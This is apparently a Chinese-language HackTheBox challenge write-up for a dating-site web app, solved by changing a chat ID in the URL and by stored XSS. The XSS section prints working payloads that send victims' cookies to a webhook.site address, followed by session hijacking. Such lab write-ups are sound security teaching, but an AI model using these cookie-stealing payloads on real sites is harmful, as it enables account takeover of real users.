---
title: HTB-Challenge-OnlyHacks
date: 2026-02-14T16:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - HTB
  - Challenge
  - XSS
---
## 注册登入

访问网址发现是一个类似交友网站的网站，可以注册登入。

![](Pasted%20image%2020260214160509.png)

注册一个账号登入进网站。网站的功能很简单，`Dashboard` 界面有名片，左滑不喜欢，右滑喜欢，可以在 `Matches` 界面和喜欢的人聊天。

![](Pasted%20image%2020260214160709.png)

这里重置了一下靶机环境，所以地址变了。在 `Matches` 界面和刚刚右滑的人尝试聊天，可以正常进行。

![](Pasted%20image%2020260214161101.png)

### 解法一

发现 `url` 处的 `rid` 为 `6`，尝试更改，测试出当 `rid` 为 `3` 时出现 `flag`。

![](Pasted%20image%2020260214161207.png)

### 解法二

尝试输入框能否解析 `html` 代码。

```html
<h1>Test</h1>
```

![](Pasted%20image%2020260214161323.png)

可以解析，尝试使用 `xss` 外带 `cookie`。

先启用 `hookweb`。浏览器访问 `https://webhook.site/`。

然后在聊天框中外带 `cookie`。

```html
<img src=x onerror="fetch('https://webhook.site/d64e8a36-1888-411a-b3c5-62b1ce0a3e2f?c='+document.cookie)">
```

下面为 `script` 格式 `payload`，无法在此 `challenge` 中执行成功

```js
<script>document.location='https://webhook.site/d64e8a36-1888-411a-b3c5-62b1ce0a3e2f?c='+document.cookie</script>
```

获得聊天对象的 `cookie`。

![](Pasted%20image%2020260214162029.png)

修改 `f12` 中 `Storge` 中的 `Cookie` 值，`f5` 刷新后获得聊天对象的界面。切换至 `Dimitris` 的聊天界面，获得 `flag`。

![](Pasted%20image%2020260214162245.png)